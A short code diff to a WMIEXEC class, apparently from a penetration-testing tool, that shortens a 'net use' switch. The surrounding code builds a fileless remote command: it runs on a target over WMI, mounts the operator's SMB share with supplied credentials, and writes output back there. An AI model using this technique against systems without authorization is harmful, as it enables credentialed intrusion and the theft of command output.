@@ -159,7 +159,7 @@ class WMIEXEC:
 
         command = self.__shell + data + ' 1> \\\\{}\\{}\\{} 2>&1'.format(local_ip, self.__share_name, self.__output)
         #adding creds gets past systems disallowing guest-auth
-        command = self.__shell + '"net use /persistent:no \\\\{}\\{} /user:{} {} ^& {} "'.format(local_ip, self.__share_name, self.__username, self.__password, command)
+        command = self.__shell + '"net use /p:no \\\\{}\\{} /user:{} {} ^& {} "'.format(local_ip, self.__share_name, self.__username, self.__password, command)
 
         logging.debug('wmi Executing_fileless command: {}'.format(command))
 
